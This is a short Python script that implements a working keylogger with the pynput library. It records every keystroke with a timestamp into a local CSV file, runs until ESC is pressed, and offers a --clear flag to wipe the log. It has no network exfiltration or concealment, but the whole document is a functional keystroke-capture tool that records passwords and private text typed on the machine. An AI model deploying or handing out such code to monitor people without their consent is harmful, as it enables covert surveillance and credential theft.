import csv
from pynput import keyboard
from datetime import datetime
import os
import argparse

class KeyLogger:
    def __init__(self, filename="keystrokes.csv"):
        self.filename = filename
        self.setup_file()

    def setup_file(self):
        # Create CSV with headers if it doesn't exist or is empty
        if not os.path.exists(self.filename) or os.stat(self.filename).st_size == 0:
            with open(self.filename, "w", newline="") as f:
                writer = csv.writer(f)
                writer.writerow(["Timestamp", "Key"])

    def on_press(self, key):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        try:
            key_str = key.char
        except AttributeError:
            key_str = str(key)

        with open(self.filename, "a", newline="") as f:
            writer = csv.writer(f)
            writer.writerow([timestamp, key_str])

        if key == keyboard.Key.esc:
            # Stop the listener when ESC is pressed
            return False

    def start(self):
        print("[+] Keylogger started. Press ESC to stop.")
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

def clear_log_file(filename):
    with open(filename, "w") as f:
        f.write("")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--clear", action="store_true", help="Clear the log file and exit.")
    args = parser.parse_args()

    if args.clear:
        clear_log_file("keystrokes.csv")
        print("[+] Log file cleared.")
    else:
        logger = KeyLogger()
        logger.start()